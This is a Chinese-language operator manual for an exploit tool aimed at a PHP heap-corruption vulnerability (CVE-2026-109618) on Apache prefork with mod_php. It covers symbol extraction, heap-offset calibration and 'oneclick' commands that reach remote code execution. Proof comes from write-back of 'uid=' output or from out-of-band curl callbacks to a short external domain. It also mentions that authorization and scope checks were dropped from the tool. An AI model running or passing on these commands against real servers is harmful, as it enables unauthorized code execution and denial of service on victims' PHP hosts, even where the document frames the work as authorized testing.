# 真实授权目标操作手册（CVE-2026-109618）

> 适用前提：**书面授权 + 能拿到目标同构建的 `libphp.so`/镜像**。
> 拿不到同构建二进制时，本工具最多做到 `AFFECTED / NEEDS_CALIBRATION`，不能声称 RCE。
>
> 本手册只解决「结果可信 + 参数可复现」，不提供任何绕过 WAF、隐藏流量、批量打点的能力。

---

## 0. 先确认四件事（缺一就停）

| # | 要确认 | 怎么确认 |
|---|---|---|
| 1 | 目标 PHP 在受影响区间 | `recon` 只读；或甲方直接给版本 |
| 2 | `post_max_size > memory_limit` | 只能在授权窗口内实测；`recon --deep` 或 `scan` |
| 3 | 入口脚本会 `session_start()` | 响应里有 `PHPSESSID`，或代码审计确认 |
| 4 | 能拿到同构建 `libphp.so` | 镜像内 `/usr/lib/apache2/modules/libphp.so`，或发行版包 |

运行时还必须是 **Apache prefork + mod_php**。nginx + php-fpm / Apache event 不在当前实现范围内。

---

## 1. 从同构建取符号，生成 profile 骨架

```bash
# 方式 A：目标镜像/容器里直接取
python attack/p2s_ext.py symbols \
  --docker <container>:/usr/lib/apache2/modules/libphp.so \
  --out profiles/target-symbols.json

# 方式 B：已经有 .so 文件
python attack/p2s_ext.py symbols \
  --elf ./libphp-target.so \
  --out profiles/target-symbols.json
```

输出里必须看到：

```
zif_system    = 0x......
zval_ptr_dtor = 0x......
```

这个 profile 里 `calibrated=false`，`ht_size`/`htdata_offset` 仍是 base 值。
**直接拿它去打会被 oneclick 拒绝（exit 15）——这是故意的。**

---

## 2. 只读侦察（零载荷）

```bash
python attack/p2s_ext.py recon -u https://target.example/ --json
```

看三件事：`php_version`、有没有 session cookie、`verdict` 是不是 `NEEDS_CALIBRATION` / `RCE_LIKELY`。

> `scan` / `oneclick` 的第一步会发 OOM 载荷（2–24MB），会打死 worker。
> **只读阶段不要跑 `scan --safe`**：`--safe` 只是跳过堆破坏验证，OOM 探针照发。

---

## 3. 校准（决定能不能打穿的关键）

`zif/dtor` 由 symbols 确定；剩下三个量必须按目标分配器标定：
`ht_size`、`htdata_offset`、`stage1_n`/`stage2_t`（不同构建可能不同）。

### 3.1 优先在「同镜像的预发/副本」上校准

```bash
python attack/p2s_ext.py calibrate \
  -u https://staging.example/ \
  --profile profiles/target-symbols.json \
  --dir /out --local-dir ./out \
  --rounds 8 --tries 2 \
  --out profiles/target-cal.json
```

成功时输出：

```
[calibrate] 命中 ht_size=167 htdata=0x690d8；回读=uid=33(www-data) ...
HIT → profiles/target-cal.json
```

### 3.2 没有可写目录：用带外回调

```bash
# 回调域名必须极短：cap=14 时 curl a.co/c1 = 12B
python attack/p2s_ext.py calibrate \
  -u https://staging.example/ \
  --profile profiles/target-symbols.json \
  --collab a.co --ht-size 167 \
  --htdata-window 0x68000:0x6C000 --htdata-step 0x100 \
  --rounds 8
```

注意：

- `curl https://...` / 长域名一定超 14B；必须是**短域名 + 80 端口**，或改用可写目录通道。
- 回调必须在授权范围内，不能用被测方不知情的第三方中转。

### 3.3 `stage1_n` / `stage2_t` 不对时

先加 `--stage1-n` 试（例如 841 → 800/900），或对构建用 `--stage2-t` 扫。
这两个量没有自动扫描器；失败时工具会停在 `Stage-1 泄漏失败` / `Stage-2 泄漏失败`，
不会误报成功。

---

## 4. 利用 + 取证（只认内容，不认退出码）

### 4.1 webroot 可写（推荐，不需要目标出网）

```bash
python attack/p2s_ext.py oneclick \
  -u https://target.example/ \
  --profile profiles/target-cal.json \
  --http-read https://target.example/ \
  --rounds 8 --tries 2 --force \
  --outdir out
```

成功判据（代码里已强制）：

- HTTP 回读内容匹配 `uid=\d+`；
- 且回读内容不等于「随机不存在路径」的软 404 页面；
- `oneclick_report.json` 里 `rce: true` 且 `proof_body` 有 `uid=`。

### 4.2 无写目录：带外回调

```bash
python attack/p2s_ext.py oneclick \
  -u https://target.example/ \
  --profile profiles/target-cal.json \
  --collab a.co --listen --listen-port 80 \
  --rounds 8 --force \
  --outdir out
```

成功判据：监听器收到 `path` 里带 token 的请求，并记录来源 IP。
**没有收到回调 = 没有证据**，不要用 `exit 0` 代替。

### 4.3 容器目录挂载（仅靶场/客户提供挂载时）

```bash
python attack/p2s_ext.py oneclick \
  -u https://target.example/ \
  --profile profiles/target-cal.json \
  --dir /out --local-dir ./out \
  --rounds 8 --force --outdir out
```

---

## 5. 失败矩阵（照着查，不要盲加轮次）

| 停在 | 含义 | 下一步 |
|---|---|---|
| `Stage-1 泄漏失败` | 版本/构建不对，或 `stage1_n` 不匹配，或没有可 OOM 的 body | 复核 `post_max > memory`；调 `--stage1-n`；确认 sink |
| `Stage-2 泄漏失败` | `dtor_offset` 不对（symbols 拿错 .so） | 重新 `symbols`，确认 .so 与目标完全同构建 |
| `Stage-3` 全 miss | `ht_size` / `htdata_offset` 不对 | 回第 3 步校准；不要直接套 bookworm 值 |
| 回读 404 | webroot 不可写、cwd 不是 docroot、相对路径没落对 | 换 `--collab`，或确认绝对可写目录 |
| 回读是站点首页 | 软 404 | 工具已排除；若仍命中，检查 `proof_body` 是否真含 `uid=` |
| `NEEDS_CALIBRATION` | profile 只有符号、没有校准 | 跑第 3 步 |

---

## 6. 仍然做不到的（结构性限制）

- **不能对任意真实网站通用**：偏移是按构建的，换镜像就得重来。
- **不能跨 MPM**：nginx + php-fpm、Apache event 未实现。
- **单命令 ≤ `ht_size-0x98-1`**（常见 14B）：不能写 webshell、反弹 shell、持久化、横向、清日志。
- **不能无损探测 `post_max_size`**：只能实测 OOM 或推断。
- **不能隐藏**：OOM 会在目标 access/error log 留下 `POST`、`zend_mm_heap corrupted`、`SIGSEGV`。

---

## 7. 自有公网靶场：和 localhost 的差异

如果靶场是你自己部署在公网的（不是客户生产），目标是验证真实网络路径，按下面固定变量。

> 现在没有任何范围/授权参数：公网靶场直接给 URL 即可。
> 仍然只对你自己的资产使用。

### 7.1 先固定变量（强烈建议）

- **单 worker**：prefork `StartServers 1`、`MinSpareServers 1`、`MaxSpareServers 1`、`MaxRequestWorkers 1`。
  这一步让「泄漏所在的 worker」和「Stage-3 落点的 worker」可确定，排除多 worker 干扰。
- **同构建**：选 `php:8.4.26-apache`。你表里只有这一行是 `RCE_READY`；
  `8.2.12` 只能 crash（README §25 标为 `KNOWN_NO_RCE`），`8.2.35` 是修复版。
- **配置**：`post_max_size=64M`、`memory_limit=8M`、`session.upload_progress.enabled=1`。
- **入口**：一个会调 `session_start()` 的脚本。
- **回读**：webroot 可写（`--http-read`），或把 `/out` 挂到宿主机（工具跑在宿主机）。
- **防火墙**：只放行你的出口 IP。这是一个真实可利用的 PHP，窗口期内会被别人扫到。

### 7.2 ASLR

- 先保持默认（开启）跑：Stage-1/2 能打印出 `chunk_base` / `libphp_base`，就说明泄漏原语在 ASLR 下成立。
- 如果泄漏成功但 Stage-3 全 miss：先确认单 worker；仍失败再校准 `htdata_offset`。
- 不要为了复现实验室直接关宿主 ASLR——那会掩盖真实环境里的问题。

### 7.3 网络

| 场景 | 命令要点 |
|---|---|
| 工具跑在笔记本 | `--http-read https://range/`；`--timeout 120`；**用域名访问**（本机 hosts 把域名指到靶场 IP），这样 Host/SNI 都对 |
| 工具跑在 VPS 宿主机 | `--dir /out --local-dir /srv/lab/out`，最稳，不受 WAN 上行影响 |
| 自签 TLS | 加 `--insecure` |
| 按 IP 直打且 vhost 只认域名 | 仅 `php2shell.py exploit` 支持 `--host-header range.example.com`；`oneclick`/`scan` 请改用域名 |
| 上行较慢 | 12MB body 至少需要 ~2Mbps 才在 120s 内发完 |

### 7.4 最稳的一条命令（工具在宿主机、`/out` 已挂载）

```bash
python attack/p2s_ext.py oneclick \
  -u http://range.example.com:8090/ \
  --profile profiles/target-cal.json \
  --dir /out --local-dir /srv/lab/out \
  --rounds 8 --timeout 120 --force
```

成功判据：`oneclick_report.json` 里 `rce: true`，且 `proof_body` 含 `uid=`。
只看退出码不算。

### 7.5 公网靶场的额外风险

- 漏洞窗口内可能被别人先打；测完立即下线或升级到 8.4.27。
- 靶场里不要放真实凭据/数据；OOM 会打崩 worker，属于可感知行为。
- 如果只是验证工具，优先 `http-read` + 单 worker + 只放行自己 IP，不要把它做成长期在线服务。
